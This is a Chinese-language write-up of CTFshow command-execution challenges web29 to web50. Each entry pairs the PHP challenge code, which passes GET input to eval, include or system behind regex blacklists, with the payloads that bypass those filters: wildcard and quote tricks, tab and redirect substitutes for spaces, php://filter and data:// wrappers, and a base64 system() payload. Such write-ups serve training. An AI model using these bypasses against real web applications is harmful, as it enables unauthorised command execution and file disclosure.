## CTFSHOW - 命令执行

[TOC]



### web29

```php
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        eval($c);
    }
```

ban了"flag"这个字符利用匹配

```python
?c=system("tac fl*");
?c=system("tac fla''g.php");
?c=system("tac fla``g.php");
```



### web30

相比于上一题多ban了`php` , `system`

```
?c=passthru("tac fl*");
```



### web31

```php
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
        eval($c);
    }
```

又是多ban了几个东西

```python
#常规操作
?c=passthru("tac%09fla*");
?c=show_source(next(array_reverse(scandir(pos(localeconv())))));
?c=eval($_GET[a]);&a=system('tac flag.php');#这里只是过滤了c参数里面的内容，利用这个东西可以实现绕过
```

同时我发现有些空格的替代不能使用`${IFS}`等，这里我们得试一试

看了其他佬的东西：

```python
c=show_source(next(array_reverse(scandir(pos(localeconv())))));

localeconv()：返回包含本地化数字和货币格式信息的关联数组。这里主要是返回数组第一个"."
pos():输出数组第一个元素，不改变指针；
scandir();遍历目录，这里因为参数为"."所以遍历当前目录
array_reverse():元组倒置
next():将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[2]取出数组也可以
show_source():查看源码
```



### web32

```php
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
        eval($c);
    }
```

这道题利用php伪协议

```python
?c=include$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php
#?>的作用是作为绕过分号，作为语句的结束。原理是：php遇到定界符关闭标签会自动在末尾加上一个分号。简单来说，就是php文件中最后一句在?>前可以不写分号。
?c=include$_GET[1]?>&1=data://text/plain,<?php system("nl flag.php")?>
```

```(空)
https://d9dfd352-3cab-4a0f-9d1a-b3177ff35ab1.challenge.ctf.show/?c=include%0A$_GET["aaa"]?>&aaa=php://filter/read=convert.base64-encode/resource=flag.php
https://d9dfd352-3cab-4a0f-9d1a-b3177ff35ab1.challenge.ctf.show/?c=include%0A$_GET[aaa]?>&aaa=php://filter/read=convert.base64-encode/resource=flag.php

```



解码之后：

```
┌──(root㉿BX-legion)-[~]
└─# echo PD9waHANCg0KLyoNCiMgLSotIGNvZGluZzogdXRmLTggLSotDQojIEBBdXRob3I6IGgxeGENCiMgQERhdGU6ICAgMjAyMC0wOS0wNCAwMDo0OToxOQ0KIyBATGFzdCBNb2RpZmllZCBieTogICBoMXhhDQojIEBMYXN0IE1vZGlmaWVkIHRpbWU6IDIwMjAtMDktMDQgMDA6NDk6MjYNCiMgQGVtYWlsOiBoMXhhQGN0ZmVyLmNvbQ0KIyBAbGluazogaHR0cHM6Ly9jdGZlci5jb20NCg0KKi8NCg0KJGZsYWc9ImN0ZnNob3d7YjJmZjU1ZDEtMGViYi00NWIxLTllOWMtMTNkYmI2NjFmZGZmfSI7DQo |base64 -d

<?php
/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:49:19
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:49:26
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/
$flag="ctfshow{b2ff55d1-0ebb-45b1-9e9c-13dbb661fdff}";
base64: invalid input
```



### web33

```php
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i", $c)){
        eval($c);
    }
```

跟上一题类似但是不能使用`php://`协议，被ban了，但是可以使用`data://`

看了一下是还可以利用日志包含绕过！！！



### web34-35-36

都是一样的

```(空)
?c=include$IFS$_GET[bx]?>&bx=php://filter/read=convert.base64-encode/resource=flag.php
```



### web37

> ```(空)
> error_reporting(0);
> if(isset($_GET['c'])){
>     $c = $_GET['c'];
>     if(!preg_match("/flag/i", $c)){
>         include($c);
>         echo $flag;
>     
>     }
>         
> }else{
>     highlight_file(__FILE__);
> }
> ```
>
> 题目如上

文件包含过滤了flag

```(空)
/?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==
PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==
<?php system('cat flag.php');?>
PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==
#得用tac或者nl
```



### web38

同37，这里基本不能用php://



### web39

> ```php
> error_reporting(0);
> if(isset($_GET['c'])){
>     $c = $_GET['c'];
>     if(!preg_match("/flag/i", $c)){
>         include($c.".php");
>     }
>         
> }else{
>     highlight_file(__FILE__);
> }
> ```
>
> 题目如上

base形式不行,相当于给你的base编码后面又加了一个php

---> 

PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==php

这里相当于闭合了

```(空)
?c=data://text/plain,<?php system("tac fla*");?>
```



### web40

> ```php
> if(isset($_GET['c'])){
>     $c = $_GET['c'];
>     if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
>         eval($c);
>     }
>         
> }else{
>     highlight_file(__FILE__);
> } 
> ```
>
> 题目如上

无字母rce



### web41

无数字rce



### web42

> ```php
> if(isset($_GET['c'])){
>     $c=$_GET['c'];
>     system($c." >/dev/null 2>&1");
> }else{
>     highlight_file(__FILE__);
> }
> ```
>
> 题目如上

采用截断的方法

```(空)
/?c=cat flag.php||ls
```

*这里有一个细节，php的代码不会明文显示，在源代码处看*

![image-20241219152606987](https://gitee.com/bx33661/image/raw/master/path/image-20241219152606987.png)

或者

```(空)
/?c=cat flag.php|base64||ls
```

---> 

```(空)
PD9waHANCg0KLyoNCiMgLSotIGNvZGluZzogdXRmLTggLSotDQojIEBBdXRob3I6IGgxeGENCiMg QERhdGU6ICAgMjAyMC0wOS0wNSAyMDo0OTo0NA0KIyBATGFzdCBNb2RpZmllZCBieTogICBoMXhh DQojIEBMYXN0IE1vZGlmaWVkIHRpbWU6IDIwMjAtMDktMDUgMjA6NDk6NTMNCiMgQGVtYWlsOiBo MXhhQGN0ZmVyLmNvbQ0KIyBAbGluazogaHR0cHM6Ly9jdGZlci5jb20NCg0KKi8NCg0KDQokZmxh Zz0iY3Rmc2hvd3s1MGI4NTdiYi0wNmU0LTRmNzctYjBkZS02MTg5ZDRhNzMxMzh9Ijs= 
```





### web43

> ```php
> if(isset($_GET['c'])){
>     $c=$_GET['c'];
>     if(!preg_match("/\;|cat/i", $c)){
>         system($c." >/dev/null 2>&1");
>     }
> }else{
>     highlight_file(__FILE__);
> }
> ```
>
> 题目如上

与上一题相比存在过滤

```(空)
/?c=nl flag.php|base64||ls
```



### web44

> ```php
> 
> if(isset($_GET['c'])){
>     $c=$_GET['c'];
>     if(!preg_match("/;|cat|flag/i", $c)){
>         system($c." >/dev/null 2>&1");
>     }
> }else{
>     highlight_file(__FILE__);
> }
> ```
>
> 题目如上

```(空)
?c=nl fl*|base64||ls
```



### web45

> ```php
> if(isset($_GET['c'])){
>     $c=$_GET['c'];
>     if(!preg_match("/\;|cat|flag| /i", $c)){
>         system($c." >/dev/null 2>&1");
>     }
> }else{
>     highlight_file(__FILE__);
> }
> ```
>
> 题目如上

相比之下又过滤了空格

```(空)
/?c=nl%09fl*|base64||ls
```



### web46

> 题目如下
>
> ```php
> 
> if(isset($_GET['c'])){
>     $c=$_GET['c'];
>     if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*/i", $c)){
>         system($c." >/dev/null 2>&1");
>     }
> }else{
>     highlight_file(__FILE__);
> }
> ```

过滤了*，数字

```(空)
?c=nl%09fla''g.php||
/?c=nl%09fla``g.php||
/?c=nl%09fla?.php||
```



### web47-48-49

> 题目如下：
> ```php
> if(isset($_GET['c'])){
>     $c=$_GET['c'];
>     if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i", $c)){
>         system($c." >/dev/null 2>&1");
>     }
> }else{
>     highlight_file(__FILE__);
> } 
> ```

其实跟上一题一样的写法

```(空)
?c=nl%09fla''g.php||
```



### web50

> 题目如下：
> ```php
> if(isset($_GET['c'])){
>     $c=$_GET['c'];
>     if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
>         system($c." >/dev/null 2>&1");
>     }
> }else{
>     highlight_file(__FILE__);
> }
> ```

%被banl

```(空)
?c=nl<fla''g.php||
?c=nl<>fla''g.php||
```

